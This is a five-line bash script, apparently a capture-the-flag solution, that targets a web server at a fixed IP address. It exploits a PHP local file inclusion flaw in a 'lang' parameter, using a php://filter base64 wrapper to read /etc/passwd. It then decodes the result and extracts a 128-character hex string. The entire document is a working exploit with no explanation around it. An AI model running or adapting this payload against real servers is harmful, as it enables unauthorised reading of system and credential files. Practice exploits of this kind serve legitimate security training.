#!/bin/bash

curl -sk 'https://46.105.49.65/05ee21b521fe/?lang=php://filter/convert.base64-encode/resource=/etc/passwd' \
    | head -n 1 \
    | base64 -d \
    | grep -oE '[0-9a-f]{128}'
